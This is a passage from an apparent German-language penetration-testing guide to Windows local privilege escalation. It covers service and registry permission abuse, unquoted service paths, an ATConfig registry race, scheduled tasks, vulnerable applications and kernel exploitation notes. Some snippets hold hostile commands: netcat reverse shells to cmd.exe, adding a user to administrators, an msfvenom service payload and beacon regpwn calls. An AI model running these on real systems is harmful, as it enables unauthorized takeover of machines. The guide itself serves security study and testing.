accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Hier kannst du accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost für den Betrieb von SSDPSRV abhängt (bei XP SP1)**

**Eine weitere Behelfslösung** für dieses Problem besteht darin, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authentifizierte Benutzer“ in diesem Szenario über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So lässt sich **sc** ändern und ausführen:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Über verschiedene Berechtigungen können Privilegien eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binary.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern der Service-Konfiguration.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Eigentums und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet ebenfalls die Möglichkeit, die Service-Konfiguration zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, die Service-Konfiguration zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Service-Binaries

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder mit einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit niedrigen Berechtigungen die Service-EXE oder ihren übergeordneten Ordner ändern können**, kann der Service häufig durch **Austauschen der Binary und Neustarten des Service** gekapert werden.

**Prüfe, ob du die von einem Service ausgeführte Binary ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binary befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Service ausgeführten Binaries ermitteln und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die ausführbare Dienstdatei oder das Verzeichnis, in dem sie liegt. Ein praktischer Ablauf zur Ausnutzung:<sup>[[27]](#references)</sup>

1. Ermittle das Dienstkonto und den Pfad zur ausführbaren Datei mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienst-Binärdatei durch einen Payload oder eine gültige bösartige Dienst-Binärdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart bzw. einen Dienst-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn ein normaler Benutzer den Dienst nicht neu starten darf, prüfe, ob er beim Systemstart automatisch gestartet wird, eine Fehleraktion eingerichtet hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienstregistrierungsschlüssel

Du solltest prüfen, ob du einen Dienstregistrierungsschlüssel ändern kannst.\
Du kannst deine **Berechtigungen** für einen **Dienstregistrierungsschlüssel** folgendermaßen **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry verfügen. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für einen Registry-Schlüssel sind von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt getrennt. Für eine Privilegieneskalation sind außerdem ein geeignetes Dienstkonfigurationsfeld, eine Möglichkeit, den Dienst auszulösen, und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Wertschreibvorgänge (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine **Race Condition mit symbolischen Registry-Links** kann diesen privilegierten Schreibvorgang in einen beliebigen HKLM-Pfad umleiten und so ein Primitive für beliebige HKLM-Wertschreibvorgänge bereitstellen.<sup>[[18]](#references)</sup>

Schlüsselpfade (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung oder bei Übergängen zum Secure Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Trage den **HKCU-ATConfig**-Wert ein, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren zum Secure Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race Condition**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE übergehen:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und löse ihn nach dem Schreibvorgang aus. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt den Arbeitsplatz** während der Race Condition.

Beispieltools (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen für den Services-Registry-Schlüssel

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie Unterschlüssel darunter erstellen können**. Bei Windows-Services reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, alle Pfadbestandteile bis zu einem Leerzeichen auszuführen.

Bei dem Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows zum Beispiel, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Alle nicht in Anführungszeichen gesetzten Dienstpfade auflisten, ausgenommen solche, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können** diese Schwachstelle mit metasploit **erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path` Sie können manuell mit metasploit eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Privilegieneskalation möglich. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skriptziele geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das in den **Aktionsargumenten** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der aufrufende Benutzer schreiben kann, ist nur dann ein Ansatzpunkt für die Ausführung über Kontogrenzen hinweg, wenn sich der konfigurierte Aufgabenprinzipal vom aufrufenden Benutzer unterscheidet und die Aufgabe tatsächlich diese Aktion ausführt. Eine ACL, die nur das Anhängen von Inhalten erlaubt, kann bei Skripten relevant sein, doch ein vorheriges `exit` oder ein anderer Kontrollfluss kann dazu führen, dass angehängte Zeilen nicht erreicht werden. Prüfen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinien zur Anwendungskontrolle, bevor Sie von einer Privilegieneskalation ausgehen. Bei der Bestandsaufnahme dürfen weder das Skript geändert noch die Aufgabe gestartet werden.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt sie über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie die effektiven Leseberechtigungen für die Datei, die Stream-Unterstützung des Dateisystems, ob der Stream verwendbare Zugangsdaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung dienen. Vermeiden Sie bei routinemäßigen Aufzählungen rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben für den geplanten Windows Driver Kit-Helfer

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das aus seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` einlesen kann. Eine geplante Aufgabe oder ein Dienst, der diesen Helfer mit einem privilegierten Konto startet, kann Schreibzugriff niedriger privilegierter Benutzer auf diese Eingabedateien in eine Befehlsausführung im Kontext dieses Kontos verwandeln, selbst wenn die ausführbare Helferdatei geschützt ist. Vergewissern Sie sich, dass ein privilegierter Prozess die Dateien verwendet und **beide** Begleitdateien erstellt oder geändert werden können; allein das Auffinden des Helfers reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren Aktionseigenschaft [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) und die ACLs der beiden Begleitdateipfade. Gibt die Aufgabe kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein Ansatzpunkt, der überprüft werden muss, und kein Beweis dafür, dass die Aufgabe dort ihre Eingaben einliest. Auch die Voraussetzung für die Projektarbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenprinzipal, statt davon auszugehen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (vielleicht können Sie eine davon überschreiben und Ihre Privilegien eskalieren) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Wiederherstellungspfad des Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und bei einem fehlgeschlagenen Ersetzen anschließend eine bereits vorhandene, schreibgeschützte Datei ausführten. Der Hersteller behob das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1. Prüfen Sie den vollständigen installierten Patchstand und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Angabe nur des Versionszweigs wie `2.1` belegt keine Betroffenheit. Die Enumeration kann Version, Dienststatus und Temp-Berechtigungen prüfen, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Prüfung des ADSelfService Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus bis einschließlich Build 6210; der Hersteller behob das Problem mit Build 6211. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für das installierte Produkt oder ein Dienstpfad ist daher ein Ansatzpunkt, aber kein Nachweis für eine Schwachstelle: Prüfen Sie den exakten Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Eine Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt eine Instanz voraus, die als SYSTEM läuft. Eine lesbare Datei `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Beleg für nutzbare Zugangsdaten oder diese SAML-Schwachstelle. Erfassen Sie ihren Pfad und ihre Zugriffsrechte, ohne sie bei der routinemäßigen Enumeration zu entpacken.

#### Grenzen von Jenkins-Controller und Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller die Berechtigung, einen Job zu erstellen oder zu konfigurieren, von der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Build bieten; prüfen Sie jedoch, ob dieser aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agenten. Auf gespeicherte Zugangsdaten kann nur zugegriffen werden, wenn der Job deren Scope nutzen darf. Prüfen Sie außerdem den Zugriff auf die Metadaten in `JENKINS_HOME`: Jenkins speichert Zugangsdaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr bloßes Vorhandensein gibt kein Passwort preis. Prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben auszugeben. Hat dieses Konto ein Schreibrecht auf `scriptPath` des AD-Benutzerobjekts, bestätigen Sie einen beschreibbaren Skriptpfad und einen tatsächlichen Anmelde- oder geplanten Prozess, der als Zielbenutzer ausgeführt wird, bevor Sie dies als benutzerübergreifende Ausführung einstufen. Weitergehende Kontrolle über Gruppen erfordert separat verifizierte effektive AD-Rechte.

#### Identität des selbstgehosteten Azure-Pipelines-Agenten

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure Pipelines-Projekt die Berechtigung, eine Pipeline zu **erstellen oder zu bearbeiten**, von der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu nutzen. [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt übermitteln und diese Pipeline auf einem selbstgehosteten Windows-Agenten ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agenten](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfen Sie die genaue Pipeline, Branch- und Ressourcenbeschränkungen, den autorisierten Pool, den ausführbaren Job und die Dienstidentität des Agenten, bevor Sie einen benutzerübergreifenden oder SYSTEM-Übergang behaupten. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind allein nur Ansatzpunkte. Prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Zugangsdaten von Microsoft Entra Connect Sync

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Connector-Zugangsdaten werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial ist [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine nach lokalem Administrator klingende Gruppe oder alleiniger Datenbankzugriff belegen weder entschlüsselbare Zugangsdaten noch eine Domäneneskalation. Prüfen Sie die tatsächlichen Datenbank-Leserechte, den Zugriff auf Dienstkonto und Schlüssel, die Installations- und SQL-Struktur, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen getrennt. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Geheimnisse abgefragt oder ausgegeben werden.

#### Berechtigungen für Druckertreiber-Support-DLLs

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Für das [Problem mit Ricoh-Druckertreibern CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) war der angegebene Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Ansatzpunkt: Prüfen Sie den effektiven Schreibzugriff nach Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt sowie ob ein aktualisierter Treiber oder ein Sicherheitsprogramm des Herstellers die Installation behoben hat. Leiten Sie aus dem Verzeichnisnamen oder der Treiberversion allein keine Schwachstelle ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei so ändern können, dass Sie eine spezielle Datei lesen können, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistence/Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable Installation oder Kopie vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (auch über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Schlüssel oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **merkwürdigen/verwundbaren Treibern von Drittanbietern**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Driver ein beliebiges Kernel-Read/Write-Primitiv bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Berechtigungen erweitern, indem du direkt ein SYSTEM-Token aus dem Kernel-Speicher stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Weiteres Material zur Windows-Kernel-Exploitation:

Ein Beispiel für einen Kernel-Mode-Ring-Buffer mit benutzerbeschreibbaren Read/Write-Registern findest du in der [USB-MIDI-Variante mit Loop-Streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, kann eine absichtliche Verlangsamung der Suche (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnissen) das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden verlängern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe-Queue-UAFs, paged-pool-Disclosures und I/O-ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer cancel-safe queue**, die eine Request/CBD freigibt, während der Queue-Lock noch gehalten wird, und einer **Disclosure durch Freigabe des Locks vor dem Kopieren**, die während `RtlCopyToUser` eine freigegebene paged-pool-Allokation leakt.<sup>[[29]](#references)</sup>

Hinweise zu Audits und Exploitation:

- **Free-under-lock + anschließendes Cancel**: Suche nach einem Erfolgspfad mit **Acquire -> CompleteRequest/free -> Release**, während der Cancel-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgspfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor der CBDQ/CSQ-Lock freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Drivers übergeben.
- **Reclaim des freigegebenen Queue-Objekts** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries sind nützlich, weil Payload und Größe kontrollierbar sind und sie später mit Pipe-Read-/Peek-Operationen untersucht werden können. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Knoten im User-Memory**, damit der Driver wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, anstatt am ursprünglichen Listenanfang anzuhalten.
- **Eine vorhersagbare Schreiboperation aufwerten**: Wenn der gefälschte Request einen verschachtelten Context-Pointer umleitet, der für Bookkeeping-Schreibzugriffe verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Schreibzugriff. Ziele in diesem Fall auf das **Längen-/Größenfeld** eines gesprühten Pool-Objekts statt auf einen abschließenden Code-/Daten-Pointer und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Read aus dem paged pool** ermöglicht.
- **Raceable-Disclosure-Muster**: Jeder Syscall mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch das Hinzufügen vieler List-/Resource-Einträge, die die endgültige Allokationsgröße eines Serializers erhöhen). Dadurch wird das Austauschfenster durch den längeren Copy-Vorgang vergrößert, ohne dass der Rechner zwangsläufig abstürzt.
